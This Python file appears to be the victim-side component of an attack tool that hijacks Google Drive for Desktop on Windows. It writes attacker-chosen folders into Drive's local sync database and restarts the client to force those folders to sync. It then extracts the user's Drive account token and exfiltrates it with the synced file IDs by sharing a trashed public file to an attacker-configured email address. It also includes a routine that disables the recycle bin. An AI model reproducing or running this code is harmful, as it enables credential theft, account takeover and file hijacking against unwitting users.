import subprocess
import sqlite3
import os
import pathlib
import win32con
import win32file
import win32api
import psutil
import uuid
import yaml
import time
import winreg

from doubledrive.cloud_drive.google_drive.google_drive import GoogleDrive

from victim_info_key import VictimInfoKey
from token_extraction import extract_google_drive_account_token_by_id
from google_drive_info import get_google_drive_info
from config import get_configs, ConfigKey

GOOGLE_DRIVE_DATA_PATH = os.path.expandvars(r"%localappdata%\Google\DriveFS")
LOCAL_APP_DATA_PATH = os.path.expandvars(r"%localappdata%")
GOOGLE_DRIVE_ROOT_PREFERENCES_DB_PATH = os.path.join(GOOGLE_DRIVE_DATA_PATH, "root_preference_sqlite.db")
GOOGLE_DRIVE_DB_MAX_IDS_TABLE = "max_ids"
GOOGLE_DRIVE_DB_ROOTS_TABLE = "roots"
MIRROR_SQLITE_DB_FILE_NAME = "mirror_sqlite.db"
MIRROR_METADATA_SQLITE_DB_FILE_NAME = "mirror_metadata_sqlite.db"

GOOGLE_DRIVE_PROCESS_NAME = "GoogleDriveFS.exe"
GOOGLE_DRIVE_LAUNCH_SCRIPT_PATH = os.path.expandvars(r"%ProgramFiles%\Google\Drive File Stream\launch.bat")
SYNC_DELAY_AFTER_GOOGLE_DRIVE_RESTART = 5


def disable_current_user_recycle_bin():
    hkcu_key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    with winreg.OpenKey(hkcu_key, r"Software\Microsoft\Windows\CurrentVersion\Policies") as policy_key:
        with winreg.CreateKey(policy_key, "Explorer") as explorer_policy_key:
            winreg.SetValue(explorer_policy_key, "NoRecycleFiles", 1)


def get_current_user_google_drive_pids():
    current_user_google_drive_pids = []
    current_user = win32api.GetUserNameEx(win32con.NameSamCompatible)

    for proc in psutil.process_iter():
        # Check if it's the Google Drive process of the current user
        # to kill only the current user's processes
        is_current_user = False
        try:
            proc_username = proc.username()
            is_current_user = current_user == proc_username
        except psutil.AccessDenied:
            pass

        if is_current_user and GOOGLE_DRIVE_PROCESS_NAME == proc.name():
            current_user_google_drive_pids.append(proc.pid)
    
    return current_user_google_drive_pids


def launch_google_drive():
    process = subprocess.Popen(f"\"{GOOGLE_DRIVE_LAUNCH_SCRIPT_PATH}\"", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    process.wait()


def restart_google_drive():
    for pid in get_current_user_google_drive_pids():
        proc = psutil.Process(pid)
        proc.kill()
    
    launch_google_drive()
    

def add_google_drive_sync_dir(account_id: str, new_sync_dir_path: str):
    google_drive_db = sqlite3.connect(GOOGLE_DRIVE_ROOT_PREFERENCES_DB_PATH)

    dir_name = os.path.basename(new_sync_dir_path)

    max_ids_cursor = google_drive_db.execute(f"SELECT * from {GOOGLE_DRIVE_DB_MAX_IDS_TABLE}")
    record = max_ids_cursor.fetchone()

    if None != record:
        max_ids = record[1]
        new_max_ids = max_ids + 1
        google_drive_db.execute(f"UPDATE {GOOGLE_DRIVE_DB_MAX_IDS_TABLE} set value = {new_max_ids} where id_type = 'max_root_id'")

    os_drive = pathlib.Path.home().drive + "\\"
    new_sync_dir_path_without_os_drive = new_sync_dir_path.replace(os_drive, "")
    os_drive_guid_path = win32file.GetVolumeNameForVolumeMountPoint(os_drive)
    os_drive_uuid = os_drive_guid_path[os_drive_guid_path.find("{") + 1 : os_drive_guid_path.find("}")]
    google_drive_db.execute(f"INSERT INTO {GOOGLE_DRIVE_DB_ROOTS_TABLE} (media_id, title, root_path, account_token, sync_type, destination, medium, state, one_shot, is_my_drive, doc_id, last_seen_absolute_path) VALUES ('{os_drive_uuid}', '{dir_name}', '{new_sync_dir_path_without_os_drive}', '{account_id}', 1, 1, 1, 2, 0, 0, '', '{new_sync_dir_path}')")
    google_drive_db.commit()
    google_drive_db.close()


def get_paths_inodes(paths: list[str]):
    inodes_to_paths = {}
    for dir_path in paths:
        # Google call it inode in there DBs but it is actually something called "file id" in Windows
        # It can be retrieved using the same way of getting the inode number on Linux computers
        windows_file_id = str(os.stat(dir_path).st_ino)
        inodes_to_paths[windows_file_id] = dir_path

    return inodes_to_paths


def get_stable_ids_by_inodes(inodes: list[str]):
    account_id = get_google_drive_info().all_accounts_preferences[0].id
    mirror_sqlite_db_path = os.path.join(GOOGLE_DRIVE_DATA_PATH, account_id, MIRROR_SQLITE_DB_FILE_NAME)
    mirror_db = sqlite3.connect(mirror_sqlite_db_path)

    sql_where_target_inodes_expression = "where inode = " + " or inode = ".join(inodes)
    target_inodes_stable_ids_cursor = mirror_db.execute(f"SELECT stable_id, inode from mirror_item {sql_where_target_inodes_expression}")

    stable_ids_to_inodes = {}
    for row in target_inodes_stable_ids_cursor.fetchall():
        stable_ids_to_inodes[str(row[0])] = str(row[1])

    if len(stable_ids_to_inodes) != len(inodes):
        raise LookupError("Couldn't find all or some of the inodes in GoogleDrive's DB")

    return stable_ids_to_inodes


def get_cloud_item_id_by_stable_id(stable_ids: list[str]):
    account_id = get_google_drive_info().all_accounts_preferences[0].id
    mirror_metadata_sqlite_db_path = os.path.join(GOOGLE_DRIVE_DATA_PATH, account_id, MIRROR_METADATA_SQLITE_DB_FILE_NAME)
    mirror_metadata_db = sqlite3.connect(mirror_metadata_sqlite_db_path)

    sql_where_target_stable_ids_expression = "where stable_id = " + " or stable_id = ".join(stable_ids)
    target_inodes_stable_ids_cursor = mirror_metadata_db.execute(f"SELECT stable_id, id from items {sql_where_target_stable_ids_expression}")

    cloud_item_id_to_stable_ids = {}
    for row in target_inodes_stable_ids_cursor.fetchall():
        if str(row[1]).startswith("local"):
            raise LookupError("Google Drive has not updated the ID of one or more of the given stable IDS yet")
        cloud_item_id_to_stable_ids[str(row[1])] = str(row[0])

    if len(cloud_item_id_to_stable_ids) != len(stable_ids):
        raise LookupError("Couldn't find all or some of the stable_ids in GoogleDrive's DB")

    return cloud_item_id_to_stable_ids


def get_sync_paths_google_drive_ids(sync_paths: list[str]):
    inodes_to_target_paths = get_paths_inodes(sync_paths)
    stable_ids_to_inodes = get_stable_ids_by_inodes(inodes_to_target_paths.keys())
    google_drive_ids_to_stable_ids = get_cloud_item_id_by_stable_id(stable_ids_to_inodes.keys())
    google_drive_ids_to_target_paths = {}
    for google_drive_item_id, stable_id in google_drive_ids_to_stable_ids.items():
        inode = stable_ids_to_inodes[stable_id]
        target_path = inodes_to_target_paths[inode]
        google_drive_ids_to_target_paths[google_drive_item_id] = target_path

    return google_drive_ids_to_target_paths
    

def main():
    # disable_current_user_recycle_bin()
    configs = get_configs()
    google_drive_info = get_google_drive_info()

    # Add each target path so sync with Google Drive
    for target_dir_path in configs[ConfigKey.TARGET_PATHS.value]:
        add_google_drive_sync_dir(google_drive_info.all_accounts_preferences[0].id, target_dir_path)

    # restart GoogleDriveFS.exe to trigger the sync to happen
    restart_google_drive()
    
    google_drive_ids_to_target_paths = None
    while None == google_drive_ids_to_target_paths:
        time.sleep(SYNC_DELAY_AFTER_GOOGLE_DRIVE_RESTART)
        try:
            google_drive_ids_to_target_paths = get_sync_paths_google_drive_ids(configs[ConfigKey.TARGET_PATHS.value])
        except LookupError:
            # Sometimes Google Drive fails to start after restart
            # If Google Drive is not running:
            if 0 == len(get_current_user_google_drive_pids()):
                launch_google_drive()
            continue
        else:
            break
    
    account_token = extract_google_drive_account_token_by_id(google_drive_info.all_accounts_preferences[0].id)

    victim_info = {
        VictimInfoKey.COMPUTER_ITEM_ID.value: google_drive_info.all_accounts_preferences[0].machine_root_doc_id,
        VictimInfoKey.TOKEN.value: account_token,
        VictimInfoKey.IDS_TO_TARGET_PATHS.value: google_drive_ids_to_target_paths
    }

    google_drive_session = GoogleDrive()
    google_drive_session.login_using_token(account_token)

    victim_info_file_name = str(uuid.uuid4())
    victim_info_file = google_drive_session.create_file(f"/{victim_info_file_name}", yaml.dump(victim_info))
    victim_info_file = google_drive_session.trash_item(victim_info_file)
    google_drive_session.make_item_public(victim_info_file)
    google_drive_session.send_item_to_email(victim_info_file, configs[ConfigKey.EXFILTRATION_EMAIL_ADDRESS.value])


if "__main__" == __name__:
    main()